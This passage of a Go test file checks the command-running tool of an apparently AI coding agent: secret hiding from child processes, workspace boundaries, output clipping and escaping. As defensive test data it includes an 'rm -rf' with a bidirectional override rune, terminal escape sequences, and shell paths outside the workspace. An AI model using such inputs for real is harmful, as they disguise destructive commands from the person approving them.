			t.Errorf("run_command(%q) = %q, want the refusal with no sign that anything ran", command, got)
		}
	}
}

// TestEnvChild is the program TestRunCommandHidesConfiguredSecretsFromTheChild
// runs: started as a child it prints the variables under test and exits, and
// otherwise does nothing. The test binary stands in for `env` so the test
// does not depend on a program the host may lack.
func TestEnvChild(t *testing.T) {
	if os.Getenv("YONDER_TOOLS_CHILD") != "env" {
		return
	}
	for _, name := range []string{"YONDER_TEST_PLAIN", "YONDER_TEST_KEY_ENV", "YONDER_TEST_HEADER_ENV"} {
		if value, ok := os.LookupEnv(name); ok {
			fmt.Printf("%s=%s\n", name, value)
		}
	}
	os.Exit(0)
}

// The names the composition root passes through HideEnv reach the child as
// absences. The child is a copy of this test binary placed inside the
// workspace, because run_command only starts programs on PATH or in the
// project, and the point is to prove the plumbing from For to the process
// rather than the filter on its own, which shell tests already.
func TestRunCommandHidesConfiguredSecretsFromTheChild(t *testing.T) {
	workspaceDir(t, nil)
	self, err := os.ReadFile(os.Args[0])
	if err != nil {
		t.Skipf("cannot read the test binary to copy it: %v", err)
	}
	child := "child" + filepath.Ext(os.Args[0])
	if err := os.WriteFile(child, self, 0o755); err != nil {
		t.Fatalf("copying the test binary into the workspace: %v", err)
	}

	t.Setenv("YONDER_TOOLS_CHILD", "env")
	t.Setenv("YONDER_TEST_PLAIN", "plain")
	t.Setenv("YONDER_TEST_KEY_ENV", "secret-key")
	t.Setenv("YONDER_TEST_HEADER_ENV", "secret-header")

	tool := find(t, For(perm.NewAutoApprove(perm.Agent), nil, HideEnv("YONDER_TEST_KEY_ENV", "YONDER_TEST_HEADER_ENV")), "run_command")
	got := run(t, tool, fmt.Sprintf(`{"command": [%q, "-test.run=^TestEnvChild$"]}`, "./"+child))

	if !strings.Contains(got, "YONDER_TEST_PLAIN=plain") {
		t.Errorf("run_command = %q, want the ordinary variable to reach the child", got)
	}
	if strings.Contains(got, "secret-") {
		t.Errorf("run_command = %q, want no configured secret to reach the child", got)
	}
}

// Options accumulate, so a root that learns the names in two places can pass
// them in two calls; and a call with none is the previous behaviour.
func TestHideEnvAccumulates(t *testing.T) {
	var s settings
	HideEnv("A", "B")(&s)
	HideEnv("C")(&s)
	if got := strings.Join(s.hiddenEnv, ","); got != "A,B,C" {
		t.Errorf("hiddenEnv = %q, want A,B,C", got)
	}
}

// The generic argument tests run in code mode, which has no exec at all, so the
// same mistakes are put to run_command separately. Each message tells the model
// what to send next: an object, a repaired object, or the argument it left out.
func TestRunCommandExplainsBadArguments(t *testing.T) {
	workspaceDir(t, nil)

	tool := find(t, For(perm.New(perm.Agent), allow().ask), "run_command")

	for _, arguments := range []string{"", "   "} {
		want := "no arguments were given; send a JSON object"
		if got := wantErr(t, tool, arguments); got != want {
			t.Errorf("run_command(%q) error = %q, want %q", arguments, got, want)
		}
	}

	if got := wantErr(t, tool, `{"command": [`); !strings.Contains(got, "arguments are not valid JSON") {
		t.Errorf("run_command error = %q, want it to blame the JSON", got)
	}

	want := fmt.Sprintf("the %q argument is required and must not be empty", "command")
	for _, arguments := range []string{`{}`, `{"command": []}`, `{"command": [""]}`, `{"command": ["   "]}`} {
		if got := wantErr(t, tool, arguments); got != want {
			t.Errorf("run_command(%s) error = %q, want %q", arguments, got, want)
		}
	}
}

// A cancelled round starts no process and asks no question, for the same reason
// the file tools touch no disk: the reader who would answer has gone.
func TestRunCommandStartsNothingWhenCancelled(t *testing.T) {
	workspaceDir(t, nil)

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	user := allow()
	tool := find(t, For(perm.New(perm.Agent), user.ask), "run_command")

	if _, err := tool.Run(ctx, `{"command": ["go", "env", "GOOS"]}`); err != context.Canceled {
		t.Errorf("run_command error = %v, want %v", err, context.Canceled)
	}
	if len(user.requests) != 0 {
		t.Errorf("the user was asked %d times after cancellation, want not at all", len(user.requests))
	}
}

// Approval is not a way out of the project. A program named by an absolute path
// is refused however the reader answered, and the refusal reaches the model so
// it learns the edge is there.
func TestRunCommandRefusesAProgramOutsideTheWorkspace(t *testing.T) {
	workspaceDir(t, nil)

	tool := find(t, For(perm.New(perm.Agent), allow().ask), "run_command")

	for _, arguments := range []string{`{"command": ["/bin/sh"]}`, `{"command": ["C:\\Windows\\System32\\cmd.exe"]}`, `{"command": ["../tool"]}`} {
		if got := wantErr(t, tool, arguments); !strings.Contains(got, "outside the workspace") {
			t.Errorf("run_command(%s) error = %q, want it to mention the workspace boundary", arguments, got)
		}
	}
}

// numberedLines builds text long enough to exceed one tool result, with every
// line distinguishable so a test can tell which end of it survived clipping.
func numberedLines(n int) string {
	var b strings.Builder
	for i := range n {
		fmt.Fprintf(&b, "line %d\n", i)
	}
	return b.String()
}

// A command that never finished is not a command that failed: the model is told
// it was stopped, rather than being handed an exit status it would misread.
func TestRanViewNamesATimeoutInsteadOfAnExitStatus(t *testing.T) {
	got := ranView([]string{"go", "test"}, shell.Result{TimedOut: true})

	if !strings.HasPrefix(got, "go test\n") {
		t.Errorf("ranView() = %q, want it to open with the command", got)
	}
	if !strings.Contains(got, "timed out and was stopped") {
		t.Errorf("ranView() = %q, want it to say the command was stopped", got)
	}
	if strings.Contains(got, "exit status") {
		t.Errorf("ranView() = %q, want no exit status for a command that never finished", got)
	}
	if !strings.Contains(got, "(no output)") {
		t.Errorf("ranView() = %q, want it to say there was no output", got)
	}
}

// A failing command reports both halves of what happened: the status it exited
// with and whatever it managed to print on the way out.
func TestRanViewReportsTheExitStatusWithTheOutput(t *testing.T) {
	got := ranView([]string{"go", "build"}, shell.Result{Code: 2, Output: "boom\n"})

	if !strings.Contains(got, "exit status 2") {
		t.Errorf("ranView() = %q, want it to name the exit status", got)
	}
	if !strings.Contains(got, "boom") {
		t.Errorf("ranView() = %q, want it to carry the output", got)
	}
}

// Output the runner refused to keep is accounted for in bytes, and the note
// reads as English on either side of the singular.
func TestRanViewCountsDroppedBytes(t *testing.T) {
	for _, tc := range []struct {
		dropped int
		want    string
	}{
		{1, "1 byte of further output"},
		{2, "2 bytes of further output"},
	} {
		got := ranView([]string{"go", "test"}, shell.Result{Output: "x\n", Dropped: tc.dropped})
		if !strings.Contains(got, tc.want) {
			t.Errorf("ranView(Dropped: %d) = %q, want it to mention %q", tc.dropped, got, tc.want)
		}
	}
}

// Output too long for one tool result keeps its beginning, loses its end, and
// says so, so the model does not read a truncated tail as the whole story.
func TestRanViewClipsLongOutputAndSaysSo(t *testing.T) {
	got := ranView([]string{"go", "test"}, shell.Result{Output: numberedLines(1200)})

	if !strings.Contains(got, "more lines were not included") {
		t.Errorf("ranView() = %q, want it to admit the output was clipped", got)
	}
	if !strings.Contains(got, "line 0\n") {
		t.Errorf("ranView() = %q, want it to keep the first line", got)
	}
	if strings.Contains(got, "line 1199") {
		t.Errorf("ranView() = %q, want the last line left out", got)
	}
}

// The command echoed back to the user has to be unambiguous: an argument that
// could be mistaken for two, or for nothing at all, is quoted.
func TestCommandViewQuotesOnlyAmbiguousArguments(t *testing.T) {
	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"go", "env", "GOOS"}, "go env GOOS"},
		{[]string{"echo", ""}, `echo ""`},
		{[]string{"echo", "a b"}, `echo "a b"`},
		{[]string{"echo", `a"b`}, `echo "a\"b"`},
		{[]string{"echo", "a\tb"}, `echo "a\tb"`},
	} {
		if got := commandView(tc.args); got != tc.want {
			t.Errorf("commandView(%q) = %q, want %q", tc.args, got, tc.want)
		}
	}
}

// A rune the terminal would act on instead of showing is spelled out as an
// escape, so that a carriage return cannot overwrite the command the reader is
// judging and a bidirectional override cannot make one path read as another.
// Ordinary non-ASCII text is left alone: a filename in another script is not
// suspicious for being in another script.
func TestCommandViewQuotesControlAndBidiRunes(t *testing.T) {
	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"echo", "a\rb"}, `echo "a\rb"`},
		{[]string{"echo", "a\x1b[2Kb"}, `echo "a\x1b[2Kb"`},
		{[]string{"rm", "-rf", "\u202e./build"}, `rm -rf "\u202e./build"`},
		{[]string{"echo", "a\u200bb"}, `echo "a\u200bb"`},
		{[]string{"echo", "a\u00a0b"}, `echo "a\u00a0b"`},
		{[]string{"echo", "a\x7fb"}, `echo "a\x7fb"`},
		{[]string{"cat", "café.txt"}, "cat café.txt"},
		{[]string{"cat", "файл.txt"}, "cat файл.txt"},
	} {
		if got := commandView(tc.args); got != tc.want {
			t.Errorf("commandView(%q) = %q, want %q", tc.args, got, tc.want)
		}
	}
}

// A mode that would ask cannot silently proceed when there is nobody to ask.
// The refusal names the target so the model learns which step needs a human.
func TestConsentFailsWhenThereIsNobodyToAsk(t *testing.T) {
	req := Request{Action: perm.Write, Target: "notes.md"}

	ok, err := consent(context.Background(), perm.New(perm.Agent), nil, req, false)

	if ok {
		t.Error("consent() approved the write with no approver, want it refused")
	}
	if err == nil || !strings.Contains(err.Error(), "no way to ask the user about notes.md") {
		t.Errorf("consent() error = %v, want it to say there is no way to ask about the target", err)
	}
}

// Short text passes through untouched: clipping is for what does not fit, and a
// zero count is how the caller knows nothing was lost.
func TestClipLeavesShortTextAlone(t *testing.T) {
	body, omitted := clip("a\nb")

	if body != "a\nb" || omitted != 0 {
		t.Errorf("clip() = %q, %d, want %q, 0", body, omitted, "a\nb")
	}
}

// Clipping cuts on a line boundary rather than mid-line, and every line it drops
// is counted, so head plus omitted accounts for the whole text.
func TestClipCutsOnALineBoundaryAndCountsTheRest(t *testing.T) {
	const total = 1200

	body, omitted := clip(numberedLines(total))

	if len(body) > maxResultBytes {
		t.Errorf("clip() kept %d bytes, want no more than %d", len(body), maxResultBytes)
	}
	if strings.HasSuffix(body, "\n") {
		t.Error("clip() ended on a newline, want it to cut before one")
	}
	if omitted == 0 {
		t.Fatal("clip() reported nothing omitted, want the tail counted")
	}
	if kept := lines(body); kept+omitted != total {
		t.Errorf("clip() kept %d lines and omitted %d, want them to sum to %d", kept, omitted, total)
	}
}

// The confirmation of a write counts lines, and counts them in English.
func TestWroteViewCountsLines(t *testing.T) {
	for _, tc := range []struct {
		content string
		want    string
	}{
		{"", "wrote main.go (0 lines)"},
		{"package main\n", "wrote main.go (1 line)"},
		{"package main\n\n", "wrote main.go (2 lines)"},
	} {
		if got := wroteView("main.go", tc.content); got != tc.want {
			t.Errorf("wroteView(%q) = %q, want %q", tc.content, got, tc.want)
		}
	}
}

// Search results are headed by a count and the query, so a model reading them
// knows how many it is looking at and what it asked for.
func TestMatchViewHeadsResultsWithACount(t *testing.T) {
	got := matchView("todo", []workspace.Match{
		{Path: "a.go", Line: 3, Text: "// todo: fix"},
		{Path: "b/c.go", Line: 11, Text: "// todo: also"},
	})

	if !strings.HasPrefix(got, `2 matches for "todo"`) {
		t.Errorf("matchView() = %q, want it to open with the count and the query", got)
	}
	if !strings.Contains(got, "a.go:3: // todo: fix") {
		t.Errorf("matchView() = %q, want the first match with its path and line", got)
	}
	if !strings.Contains(got, "b/c.go:11: // todo: also") {
		t.Errorf("matchView() = %q, want the nested match with its path and line", got)
	}
}

// Finding nothing is a result, not an error, and it repeats the query so the
// model can see what it actually searched for.
func TestMatchViewReportsNoMatchesAsAResult(t *testing.T) {
	if got, want := matchView("todo", nil), `no matches for "todo"`; got != want {
		t.Errorf("matchView() = %q, want %q", got, want)
	}
}

// A file's contents arrive under their path, and an empty file says so rather
// than arriving as a bare heading the model has to interpret.
func TestFileViewHeadsContentWithThePath(t *testing.T) {
	if got, want := fileView("a.go", "package a\n"), "a.go\npackage a"; got != want {
		t.Errorf("fileView() = %q, want %q", got, want)
	}
	if got, want := fileView("a.go", "\n\n"), "a.go\n(empty file)"; got != want {
		t.Errorf("fileView() = %q, want %q", got, want)
	}
}

// Arguments the model got wrong come back as advice: what was missing, or that
// what it sent was not JSON at all.
func TestDecodeExplainsWhatWentWrong(t *testing.T) {
	var into map[string]any

	if err := decode("  ", &into); err == nil || !strings.Contains(err.Error(), "no arguments were given") {
		t.Errorf("decode(\"\") error = %v, want it to say no arguments were given", err)
	}
	if err := decode("{", &into); err == nil || !strings.Contains(err.Error(), "not valid JSON") {
		t.Errorf("decode(\"{\") error = %v, want it to say the arguments are not valid JSON", err)
	}
}

// A required argument names itself in the refusal, and says that empty does not
// count as given.
func TestErrNeedsNamesTheField(t *testing.T) {
	want := `the "path" argument is required and must not be empty`

	if got := errNeeds("path").Error(); got != want {
		t.Errorf("errNeeds(\"path\") = %q, want %q", got, want)
	}
}
